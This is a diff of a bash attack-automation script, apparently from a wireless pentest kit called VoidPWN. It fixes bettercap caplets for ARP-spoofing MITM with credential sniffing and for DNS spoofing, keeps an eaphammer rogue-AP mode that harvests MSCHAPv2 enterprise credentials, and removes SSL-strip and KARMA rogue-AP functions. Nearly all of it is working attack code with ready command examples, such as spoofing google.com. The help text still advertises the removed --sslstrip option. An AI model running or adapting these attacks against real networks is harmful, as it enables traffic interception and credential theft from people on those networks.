@@ -101,7 +101,7 @@ bettercap_mitm() {
 
     local caplet
     if [[ -n "$target" ]]; then
-        caplet="net.probe on; arp.spoof.targets $target; arp.spoof on; net.sniff on"
+        caplet="net.probe on; set arp.spoof.targets $target; arp.spoof on; net.sniff on"
     else
         caplet="net.probe on; arp.spoof on; net.sniff on"
     fi
@@ -111,57 +111,6 @@ bettercap_mitm() {
 
     disable_ip_forward
     log_success "MITM session ended. Output saved to: $log_file"
-}
-
-################################################################################
-# ATTACK 2: SSL Strip via Bettercap HTTP proxy + HSTS hijack
-################################################################################
-bettercap_sslstrip() {
-    local interface="$1"
-    local target="$2"
-
-    if ! command -v bettercap &>/dev/null; then
-        log_error "bettercap not found. Install with: sudo apt install bettercap"
-        exit 1
-    fi
-
-    [[ -z "$interface" ]] && interface=$(detect_interface)
-    if [[ -z "$interface" ]]; then
-        log_error "No network interface detected"
-        exit 1
-    fi
-
-    local timestamp
-    timestamp=$(date +%Y%m%d_%H%M%S)
-    local log_file="$OUTPUT_DIR/sslstrip_${timestamp}.txt"
-
-    enable_ip_forward
-
-    log_info "Starting SSL Strip on interface: $interface"
-    [[ -n "$target" ]] && log_info "Targeting: $target" || log_info "Targeting: full subnet"
-
-    local arp_part="arp.spoof on"
-    [[ -n "$target" ]] && arp_part="arp.spoof.targets $target; arp.spoof on"
-
-    # Try hstshijack caplet first; fall back to bare http.proxy
-    local hstshijack_caplet
-    hstshijack_caplet=$(find /usr/share/bettercap -name "hstshijack.cap" 2>/dev/null | head -n 1)
-    hstshijack_caplet="${hstshijack_caplet:-$(find /root/.bettercap -name "hstshijack.cap" 2>/dev/null | head -n 1)}"
-
-    local caplet
-    if [[ -n "$hstshijack_caplet" ]]; then
-        log_info "Using hstshijack caplet: $hstshijack_caplet"
-        caplet="net.probe on; $arp_part; caplets.show; include $hstshijack_caplet"
-    else
-        log_warning "hstshijack caplet not found — using bare http.proxy (weaker SSL strip)"
-        caplet="net.probe on; $arp_part; http.proxy on; net.sniff on"
-    fi
-
-    log_warning "Press Ctrl+C to stop and restore ARP tables"
-    bettercap -iface "$interface" -eval "$caplet" 2>&1 | tee "$log_file"
-
-    disable_ip_forward
-    log_success "SSL Strip session ended. Output saved to: $log_file"
 }
 
 ################################################################################
@@ -197,45 +146,13 @@ bettercap_dns_spoof() {
     log_info "Starting DNS Spoof on interface: $interface"
     log_info "Spoofing: $domain → $redirect_ip"
 
-    local caplet="net.probe on; arp.spoof on; dns.spoof.domains $domain; dns.spoof.address $redirect_ip; dns.spoof on; net.sniff on"
+    local caplet="net.probe on; arp.spoof on; set dns.spoof.domains $domain; set dns.spoof.address $redirect_ip; dns.spoof on; net.sniff on"
 
     log_warning "Press Ctrl+C to stop and restore ARP/DNS"
     bettercap -iface "$interface" -eval "$caplet" 2>&1 | tee "$log_file"
 
     disable_ip_forward
     log_success "DNS Spoof session ended. Output saved to: $log_file"
-}
-
-################################################################################
-# ATTACK 4: KARMA Rogue AP — respond to any SSID probe
-################################################################################
-karma_attack() {
-    local interface="$1"
-
-    if ! command -v bettercap &>/dev/null; then
-        log_error "bettercap not found. Install with: sudo apt install bettercap"
-        exit 1
-    fi
-
-    [[ -z "$interface" ]] && interface=$(detect_interface)
-    if [[ -z "$interface" ]]; then
-        log_error "No wireless interface detected"
-        exit 1
-    fi
-
-    local timestamp
-    timestamp=$(date +%Y%m%d_%H%M%S)
-    local log_file="$OUTPUT_DIR/karma_${timestamp}.txt"
-
-    log_info "Starting KARMA rogue AP on interface: $interface"
-    log_info "Device will auto-associate to any probe request"
-    log_warning "Ensure interface is NOT in monitor mode (KARMA uses managed mode)"
-    log_warning "Press Ctrl+C to stop"
-
-    # Use bettercap wifi module to respond to all probes
-    bettercap -iface "$interface" -eval "wifi.recon on; wifi.ap on; net.sniff on" 2>&1 | tee "$log_file"
-
-    log_success "KARMA session ended. Output saved to: $log_file"
 }
 
 ################################################################################
@@ -274,7 +191,7 @@ eaphammer_enterprise() {
     log_warning "Press Ctrl+C to stop"
 
     cd /opt/eaphammer || exit 1
-    ./eaphammer -i "$interface" --essid "$ssid" --creds --negotiate balanced 2>&1 | tee "$log_file"
+    ./eaphammer -i "$interface" --essid "$ssid" --creds 2>&1 | tee "$log_file"
 
     log_success "Enterprise AP session ended. Output saved to: $log_file"
 }
@@ -311,7 +228,7 @@ pcredz_analyze() {
         # Find most recent capture file in OUTPUT_DIR
         local latest
         latest=$(find "$OUTPUT_DIR" -maxdepth 1 \( -name "*.cap" -o -name "*.pcap" -o -name "*.pcapng" \) \
-            -newer /proc/1 2>/dev/null | sort -t_ -k2,2r | head -n 1)
+            -mmin -120 2>/dev/null | sort -t_ -k2,2r | head -n 1)
         # Fallback: most recently modified
         [[ -z "$latest" ]] && latest=$(find "$OUTPUT_DIR" -maxdepth 1 \
             \( -name "*.cap" -o -name "*.pcap" -o -name "*.pcapng" \) \
@@ -348,7 +265,6 @@ ${YELLOW}Options:${NC}
   --bettercap               Full MITM: ARP poison + credential sniff
   --sslstrip                MITM + SSL strip via hstshijack/http.proxy
   --dnsspoof                DNS spoofing (requires --domain and --redirect)
-  --karma                   KARMA rogue AP (respond to all SSID probes)
   --eaphammer               WPA Enterprise rogue AP (harvest MSCHAPV2 creds)
   --pcredz                  Parse credentials from .cap/.pcap captures
   --help                    Show this help
@@ -364,9 +280,7 @@ ${YELLOW}Common Flags:${NC}
 ${YELLOW}Examples:${NC}
   sudo $0 --bettercap
   sudo $0 --bettercap --interface wlan0 --target 192.168.1.50
-  sudo $0 --sslstrip --target 192.168.1.50
   sudo $0 --dnsspoof --domain google.com --redirect 192.168.1.1
-  sudo $0 --karma --interface wlan1
   sudo $0 --eaphammer --ssid "CorpNet" --interface wlan1
   sudo $0 --pcredz
   sudo $0 --pcredz --file ~/VoidPWN/output/captures/handshake_20251218.cap
@@ -399,9 +313,7 @@ main() {
     while [[ $# -gt 0 ]]; do
         case "$1" in
             --bettercap)   cmd="bettercap" ;;
-            --sslstrip)    cmd="sslstrip" ;;
             --dnsspoof)    cmd="dnsspoof" ;;
-            --karma)       cmd="karma" ;;
             --eaphammer)   cmd="eaphammer" ;;
             --pcredz)      cmd="pcredz" ;;
             --interface)   interface="$2"; shift ;;
@@ -417,9 +329,7 @@ main() {
 
     case "$cmd" in
         bettercap)  bettercap_mitm "$interface" "$target" ;;
-        sslstrip)   bettercap_sslstrip "$interface" "$target" ;;
         dnsspoof)   bettercap_dns_spoof "$interface" "$domain" "$redirect" ;;
-        karma)      karma_attack "$interface" ;;
         eaphammer)  eaphammer_enterprise "$interface" "$ssid" ;;
         pcredz)     pcredz_analyze "$cap_file" ;;
         *)          show_help ;;
